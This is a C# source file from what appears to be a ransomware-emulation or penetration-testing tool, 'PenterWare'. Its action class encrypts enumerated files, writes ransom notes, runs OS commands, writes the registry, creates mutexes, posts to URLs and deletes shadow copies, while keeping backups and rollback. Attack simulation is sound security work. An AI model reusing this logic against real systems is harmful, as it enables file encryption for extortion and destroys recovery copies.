using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using PenterWare.Actions.OsCommands;
using PenterWare.Actions.Results;
using PenterWare.Utils;

namespace PenterWare.Actions;

internal class FilesEncryptionAction : BaseAction<FilesEncryptionResult>
{
	public static string Name = "FilesEncryption";

	public double NextReportProgress = 10.0;

	public override string ActionName => Name;

	protected override void Run()
	{
		base.Result.TargetUsername = Policy.TargetUsername;
		base.Result.BaseDirectory = Policy.BaseDirectory;
		RunPreEncryptionSubActions();
		GeneralUtils.Log("Running EncryptionAction");
		foreach (string enumeratedFilePath in RunRegistry.Filesystem.GetEnumeratedFilePaths())
		{
			EncryptFile(enumeratedFilePath);
		}
		RunRegistry.Session.SendReceiveAck(base.Result);
		RunPostEncryptionSubActions();
	}

	private void RunPreEncryptionSubActions()
	{
		bool flag = false;
		GeneralUtils.Log("Running Pre Encryption Sub Actions");
		if (!ResourceData.Strings.Equals(string.Empty))
		{
			flag = true;
			GeneralUtils.Log("Sending injected strings");
			SendInjectedStringsAction subAction = new SendInjectedStringsAction();
			RunSubAction(subAction);
		}
		if (!ResourceData.NamedPipes.Equals(string.Empty))
		{
			flag = true;
			GeneralUtils.Log("Generating named pipes");
			NamedPipesAction subAction2 = new NamedPipesAction();
			RunSubAction(subAction2);
		}
		if (Policy.Acts != null && Policy.Acts.Any())
		{
			foreach (string act in Policy.Acts)
			{
				List<RunOsCommandsAction> actionClass = OsCommandsFactory.getActionClass(act);
				if (actionClass == null)
				{
					continue;
				}
				foreach (RunOsCommandsAction item in actionClass)
				{
					GeneralUtils.Log("Running " + item.ActionName + " commands");
					RunSubAction(item);
				}
				flag = true;
			}
		}
		if (!ResourceData.MutexToCreate.Equals(string.Empty))
		{
			flag = true;
			GeneralUtils.Log("Creating mutex");
			CreateMutexAction subAction3 = new CreateMutexAction();
			RunSubAction(subAction3);
		}
		if (!ResourceData.RegistryPathsCommaSeparated.Equals(string.Empty))
		{
			flag = true;
			GeneralUtils.Log("Writing registry");
			RegistryWriteAction subAction4 = new RegistryWriteAction();
			RunSubAction(subAction4);
		}
		if (!ResourceData.PathsToAccessCommaSeperated.Equals(string.Empty))
		{
			flag = true;
			GeneralUtils.Log("Accessing file");
			FileAccessAction subAction5 = new FileAccessAction();
			RunSubAction(subAction5);
		}
		if (!flag)
		{
			RunRegistry.Session.SendDummyData();
		}
	}

	private void RunPostEncryptionSubActions()
	{
		bool flag = false;
		GeneralUtils.Log("Running Post Encryption Sub Actions");
		if (!ResourceData.DNSsCommaSeparated.Equals(string.Empty))
		{
			flag = true;
			GeneralUtils.Log("Querying DNSs");
			DNSsPostAction subAction = new DNSsPostAction();
			RunSubAction(subAction);
		}
		if (!ResourceData.UrlsCommaSeparated.Equals(string.Empty))
		{
			flag = true;
			GeneralUtils.Log("Posting to urls");
			UrlsPostAction subAction2 = new UrlsPostAction();
			RunSubAction(subAction2);
		}
		if (!ResourceData.DeleteShadowMode.Equals(string.Empty))
		{
			flag = true;
			GeneralUtils.Log("Deleting shadows method " + ResourceData.DeleteShadowMode);
			DeleteShadowCopyAction subAction3 = new DeleteShadowCopyAction();
			RunSubAction(subAction3);
		}
		if (!flag)
		{
			RunRegistry.Session.SendDummyData();
		}
	}

	private void RunSubAction(IAction<ActionResult> subAction)
	{
		ActionResult toSend = subAction.RunAction();
		RunRegistry.Session.SendReceiveAck(toSend);
	}

	protected void EncryptFile(string enumeratedPath)
	{
		if (!File.Exists(enumeratedPath))
		{
			GeneralUtils.Log("File " + enumeratedPath + " does not exist, skipping.");
			return;
		}
		GeneralUtils.Log("Encrypting " + enumeratedPath);
		string text = RunRegistry.Filesystem.EnumeratedFilePathsToBackups[enumeratedPath];
		string text2 = text.Replace(RunRegistry.Filesystem.BackupPathSuffix, RunRegistry.Filesystem.EncryptedPathSuffix);
		bool done = false;
		double num = 0.0;
		string text3 = string.Empty;
		try
		{
			RunRegistry.Filesystem.WriteRansomNote(enumeratedPath);
			RunRegistry.Cipher.EncryptFile(enumeratedPath, text);
			num = FileUtils.GetFileSizeMB(enumeratedPath) / RunRegistry.Filesystem.CurrentEnumSize * 100.0;
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			File.Move(text, text2);
			if (!RunRegistry.Filesystem.CompareFileHashes(enumeratedPath, text2))
			{
				GeneralUtils.Log("Encrypted " + enumeratedPath + " successfully");
			}
			done = true;
		}
		catch (Exception ex)
		{
			text3 = ex.Message;
			GeneralUtils.Log("Error " + text3 + " while encrypting " + enumeratedPath + ". Rolling back");
			if (!(ex is FileNotFoundException) && !(ex is DirectoryNotFoundException))
			{
				RunRegistry.Filesystem.Rollback(enumeratedPath, text);
				RunRegistry.Filesystem.Rollback(enumeratedPath, text2);
			}
		}
		base.Result.EncryptedFiles[enumeratedPath] = new FilesEncryptionResult.EncryptionStatus
		{
			EncryptedPath = text2,
			BackupPath = text,
			Done = done,
			ErrorStatus = text3,
			SHA256 = CryptoUtils.SHA256File(text2)
		};
		base.Result.EncryptionProgress += num;
		if (base.Result.EncryptionProgress >= NextReportProgress)
		{
			RunRegistry.Session.SendReceiveAck(base.Result);
			do
			{
				NextReportProgress += 10.0;
			}
			while (NextReportProgress < base.Result.EncryptionProgress);
		}
	}
}
